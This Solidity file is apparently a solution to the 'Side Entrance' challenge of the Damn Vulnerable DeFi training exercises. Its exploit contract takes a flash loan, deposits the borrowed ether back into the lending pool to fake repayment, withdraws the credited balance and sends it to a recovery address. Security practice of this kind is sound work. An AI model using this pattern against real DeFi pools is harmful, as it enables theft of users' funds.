// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {IFlashLoanEtherReceiver, SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceExploit is IFlashLoanEtherReceiver{
    SideEntranceLenderPool public pool;
    address recovery;

    constructor(address poolAddress, address recoveryAddress) {
        pool = SideEntranceLenderPool(poolAddress);
        recovery = recoveryAddress;
    }   

    function execute() external payable override{
        pool.deposit{value: msg.value}();
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);

        pool.withdraw();

        payable(recovery).transfer(amount);
    }

    receive() external payable {}
}
